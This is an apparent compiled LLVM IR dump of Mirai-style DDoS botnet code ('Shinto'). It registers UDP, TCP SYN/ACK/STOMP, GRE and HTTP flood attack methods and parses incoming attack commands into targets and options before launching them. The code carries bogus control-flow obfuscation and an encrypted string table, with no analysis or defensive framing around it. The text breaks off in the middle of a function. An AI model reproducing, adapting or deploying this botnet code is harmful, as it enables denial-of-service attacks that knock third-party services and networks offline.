; ModuleID = 'host/ir_bcf/Shinto.d.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [63 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 1043935, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  call void @add_attack(i8 zeroext 9, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* bitcast (void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*))
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = load i32, i32* @x.5
  %4 = load i32, i32* @y.6
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_target*, align 8
  %19 = alloca %struct.attack_option*, align 8
  %20 = alloca i8, align 1
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store %struct.attack_target* null, %struct.attack_target** %18, align 8
  store %struct.attack_option* null, %struct.attack_option** %19, align 8
  %21 = load i32, i32* %12, align 4
  %22 = sext i32 %21 to i64
  %23 = icmp ult i64 %22, 4
  %24 = load i32, i32* @x.5
  %25 = load i32, i32* @y.6
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %33

; <label>:32:                                     ; preds = %originalBBpart2
  br label %395

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i32, i32* @x.5
  %35 = load i32, i32* @y.6
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i8*, i8** %11, align 8
  %43 = bitcast i8* %42 to i32*
  %44 = load i32, i32* %43, align 4
  %45 = call i32 @ntohl(i32 %44) #7
  store i32 %45, i32* %14, align 4
  %46 = load i8*, i8** %11, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 4
  store i8* %47, i8** %11, align 8
  %48 = load i32, i32* %12, align 4
  %49 = sext i32 %48 to i64
  %50 = sub i64 %49, 4
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %12, align 4
  %53 = icmp eq i32 %52, 0
  %54 = load i32, i32* @x.5
  %55 = load i32, i32* @y.6
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %53, label %62, label %79

; <label>:62:                                     ; preds = %originalBBpart24
  %63 = load i32, i32* @x.5
  %64 = load i32, i32* @y.6
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  %71 = load i32, i32* @x.5
  %72 = load i32, i32* @y.6
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %395

; <label>:79:                                     ; preds = %originalBBpart24
  %80 = load i8*, i8** %11, align 8
  %81 = getelementptr inbounds i8, i8* %80, i32 1
  store i8* %81, i8** %11, align 8
  %82 = load i8, i8* %80, align 1
  store i8 %82, i8* %15, align 1
  %83 = load i32, i32* %12, align 4
  %84 = sext i32 %83 to i64
  %85 = sub i64 %84, 1
  %86 = trunc i64 %85 to i32
  store i32 %86, i32* %12, align 4
  %87 = load i32, i32* %12, align 4
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %79
  br label %395

; <label>:90:                                     ; preds = %79
  %91 = load i8*, i8** %11, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %11, align 8
  %93 = load i8, i8* %91, align 1
  store i8 %93, i8* %16, align 1
  %94 = load i32, i32* %12, align 4
  %95 = sext i32 %94 to i64
  %96 = sub i64 %95, 1
  %97 = trunc i64 %96 to i32
  store i32 %97, i32* %12, align 4
  %98 = load i8, i8* %16, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %118

; <label>:101:                                    ; preds = %90
  %102 = load i32, i32* @x.5
  %103 = load i32, i32* @y.6
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %101
  %110 = load i32, i32* @x.5
  %111 = load i32, i32* @y.6
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %395

; <label>:118:                                    ; preds = %90
  %119 = load i32, i32* @x.5
  %120 = load i32, i32* @y.6
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %118
  %127 = load i32, i32* %12, align 4
  %128 = sext i32 %127 to i64
  %129 = load i8, i8* %16, align 1
  %130 = zext i8 %129 to i64
  %131 = mul i64 5, %130
  %132 = icmp ult i64 %128, %131
  %133 = load i32, i32* @x.5
  %134 = load i32, i32* @y.6
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart219, label %originalBB14alteredBB

originalBBpart219:                                ; preds = %originalBB14
  br i1 %132, label %141, label %142

; <label>:141:                                    ; preds = %originalBBpart219
  br label %395

; <label>:142:                                    ; preds = %originalBBpart219
  %143 = load i8, i8* %16, align 1
  %144 = zext i8 %143 to i64
  %145 = call noalias i8* @calloc(i64 %144, i64 24) #6
  %146 = bitcast i8* %145 to %struct.attack_target*
  store %struct.attack_target* %146, %struct.attack_target** %18, align 8
  store i32 0, i32* %13, align 4
  br label %147

; <label>:147:                                    ; preds = %194, %142
  %148 = load i32, i32* %13, align 4
  %149 = load i8, i8* %16, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp slt i32 %148, %150
  br i1 %151, label %152, label %197

; <label>:152:                                    ; preds = %147
  %153 = load i8*, i8** %11, align 8
  %154 = bitcast i8* %153 to i32*
  %155 = load i32, i32* %154, align 4
  %156 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %157 = load i32, i32* %13, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i64 %158
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %159, i32 0, i32 1
  store i32 %155, i32* %160, align 4
  %161 = load i8*, i8** %11, align 8
  %162 = getelementptr inbounds i8, i8* %161, i64 4
  store i8* %162, i8** %11, align 8
  %163 = load i8*, i8** %11, align 8
  %164 = getelementptr inbounds i8, i8* %163, i32 1
  store i8* %164, i8** %11, align 8
  %165 = load i8, i8* %163, align 1
  %166 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %167 = load i32, i32* %13, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 2
  store i8 %165, i8* %170, align 4
  %171 = load i32, i32* %12, align 4
  %172 = sext i32 %171 to i64
  %173 = sub i64 %172, 5
  %174 = trunc i64 %173 to i32
  store i32 %174, i32* %12, align 4
  %175 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %176 = load i32, i32* %13, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i64 %177
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i32 0, i32 0
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %179, i32 0, i32 0
  store i16 2, i16* %180, align 4
  %181 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %182 = load i32, i32* %13, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 1
  %186 = load i32, i32* %185, align 4
  %187 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %188 = load i32, i32* %13, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i64 %189
  %191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i32 0, i32 0
  %192 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %191, i32 0, i32 2
  %193 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %192, i32 0, i32 0
  store i32 %186, i32* %193, align 4
  br label %194

; <label>:194:                                    ; preds = %152
  %195 = load i32, i32* %13, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %13, align 4
  br label %147

; <label>:197:                                    ; preds = %147
  %198 = load i32, i32* %12, align 4
  %199 = sext i32 %198 to i64
  %200 = icmp ult i64 %199, 1
  br i1 %200, label %201, label %218

; <label>:201:                                    ; preds = %197
  %202 = load i32, i32* @x.5
  %203 = load i32, i32* @y.6
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %201
  %210 = load i32, i32* @x.5
  %211 = load i32, i32* @y.6
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %395

; <label>:218:                                    ; preds = %197
  %219 = load i8*, i8** %11, align 8
  %220 = getelementptr inbounds i8, i8* %219, i32 1
  store i8* %220, i8** %11, align 8
  %221 = load i8, i8* %219, align 1
  store i8 %221, i8* %17, align 1
  %222 = load i32, i32* %12, align 4
  %223 = sext i32 %222 to i64
  %224 = sub i64 %223, 1
  %225 = trunc i64 %224 to i32
  store i32 %225, i32* %12, align 4
  %226 = load i8, i8* %17, align 1
  %227 = zext i8 %226 to i32
  %228 = icmp sgt i32 %227, 0
  br i1 %228, label %229, label %371

; <label>:229:                                    ; preds = %218
  %230 = load i8, i8* %17, align 1
  %231 = zext i8 %230 to i64
  %232 = call noalias i8* @calloc(i64 %231, i64 16) #6
  %233 = bitcast i8* %232 to %struct.attack_option*
  store %struct.attack_option* %233, %struct.attack_option** %19, align 8
  store i32 0, i32* %13, align 4
  br label %234

; <label>:234:                                    ; preds = %367, %229
  %235 = load i32, i32* %13, align 4
  %236 = load i8, i8* %17, align 1
  %237 = zext i8 %236 to i32
  %238 = icmp slt i32 %235, %237
  br i1 %238, label %239, label %370

; <label>:239:                                    ; preds = %234
  %240 = load i32, i32* %12, align 4
  %241 = sext i32 %240 to i64
  %242 = icmp ult i64 %241, 1
  br i1 %242, label %243, label %260

; <label>:243:                                    ; preds = %239
  %244 = load i32, i32* @x.5
  %245 = load i32, i32* @y.6
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %243
  %252 = load i32, i32* @x.5
  %253 = load i32, i32* @y.6
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %395

; <label>:260:                                    ; preds = %239
  %261 = load i32, i32* @x.5
  %262 = load i32, i32* @y.6
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %260
  %269 = load i8*, i8** %11, align 8
  %270 = getelementptr inbounds i8, i8* %269, i32 1
  store i8* %270, i8** %11, align 8
  %271 = load i8, i8* %269, align 1
  %272 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %273 = load i32, i32* %13, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %272, i64 %274
  %276 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %275, i32 0, i32 1
  store i8 %271, i8* %276, align 8
  %277 = load i32, i32* %12, align 4
  %278 = sext i32 %277 to i64
  %279 = sub i64 %278, 1
  %280 = trunc i64 %279 to i32
  store i32 %280, i32* %12, align 4
  %281 = load i32, i32* %12, align 4
  %282 = sext i32 %281 to i64
  %283 = icmp ult i64 %282, 1
  %284 = load i32, i32* @x.5
  %285 = load i32, i32* @y.6
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBBpart234, label %originalBB29alteredBB

originalBBpart234:                                ; preds = %originalBB29
  br i1 %283, label %292, label %309

; <label>:292:                                    ; preds = %originalBBpart234
  %293 = load i32, i32* @x.5
  %294 = load i32, i32* @y.6
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %292
  %301 = load i32, i32* @x.5
  %302 = load i32, i32* @y.6
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %395

; <label>:309:                                    ; preds = %originalBBpart234
  %310 = load i8*, i8** %11, align 8
  %311 = getelementptr inbounds i8, i8* %310, i32 1
  store i8* %311, i8** %11, align 8
  %312 = load i8, i8* %310, align 1
  store i8 %312, i8* %20, align 1
  %313 = load i32, i32* %12, align 4
  %314 = sext i32 %313 to i64
  %315 = sub i64 %314, 1
  %316 = trunc i64 %315 to i32
  store i32 %316, i32* %12, align 4
  %317 = load i32, i32* %12, align 4
  %318 = load i8, i8* %20, align 1
  %319 = zext i8 %318 to i32
  %320 = icmp slt i32 %317, %319
  br i1 %320, label %321, label %338

; <label>:321:                                    ; preds = %309
  %322 = load i32, i32* @x.5
  %323 = load i32, i32* @y.6
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %321
  %330 = load i32, i32* @x.5
  %331 = load i32, i32* @y.6
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %395

; <label>:338:                                    ; preds = %309
  %339 = load i8, i8* %20, align 1
  %340 = zext i8 %339 to i32
  %341 = add nsw i32 %340, 1
  %342 = sext i32 %341 to i64
  %343 = call noalias i8* @calloc(i64 %342, i64 1) #6
  %344 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %345 = load i32, i32* %13, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %344, i64 %346
  %348 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %347, i32 0, i32 0
  store i8* %343, i8** %348, align 8
  %349 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %350 = load i32, i32* %13, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %349, i64 %351
  %353 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %352, i32 0, i32 0
  %354 = load i8*, i8** %353, align 8
  %355 = load i8*, i8** %11, align 8
  %356 = load i8, i8* %20, align 1
  %357 = zext i8 %356 to i32
  call void @util_memcpy(i8* %354, i8* %355, i32 %357)
  %358 = load i8, i8* %20, align 1
  %359 = zext i8 %358 to i32
  %360 = load i8*, i8** %11, align 8
  %361 = sext i32 %359 to i64
  %362 = getelementptr inbounds i8, i8* %360, i64 %361
  store i8* %362, i8** %11, align 8
  %363 = load i8, i8* %20, align 1
  %364 = zext i8 %363 to i32
  %365 = load i32, i32* %12, align 4
  %366 = sub nsw i32 %365, %364
  store i32 %366, i32* %12, align 4
  br label %367

; <label>:367:                                    ; preds = %338
  %368 = load i32, i32* %13, align 4
  %369 = add nsw i32 %368, 1
  store i32 %369, i32* %13, align 4
  br label %234

; <label>:370:                                    ; preds = %234
  br label %371

; <label>:371:                                    ; preds = %370, %218
  %372 = load i32, i32* @x.5
  %373 = load i32, i32* @y.6
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %371
  %380 = call i32* @__errno_location() #7
  store i32 0, i32* %380, align 4
  %381 = load i32, i32* %14, align 4
  %382 = load i8, i8* %15, align 1
  %383 = load i8, i8* %16, align 1
  %384 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %385 = load i8, i8* %17, align 1
  %386 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  call void @attack_start(i32 %381, i8 zeroext %382, i8 zeroext %383, %struct.attack_target* %384, i8 zeroext %385, %struct.attack_option* %386)
  %387 = load i32, i32* @x.5
  %388 = load i32, i32* @y.6
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %395

; <label>:395:                                    ; preds = %originalBBpart246, %originalBBpart242, %originalBBpart238, %originalBBpart227, %originalBBpart223, %141, %originalBBpart212, %89, %originalBBpart28, %32
  %396 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %397 = icmp ne %struct.attack_target* %396, null
  br i1 %397, label %398, label %417

; <label>:398:                                    ; preds = %395
  %399 = load i32, i32* @x.5
  %400 = load i32, i32* @y.6
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %398
  %407 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %408 = bitcast %struct.attack_target* %407 to i8*
  call void @free(i8* %408) #6
  %409 = load i32, i32* @x.5
  %410 = load i32, i32* @y.6
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %417

; <label>:417:                                    ; preds = %originalBBpart250, %395
  %418 = load i32, i32* @x.5
  %419 = load i32, i32* @y.6
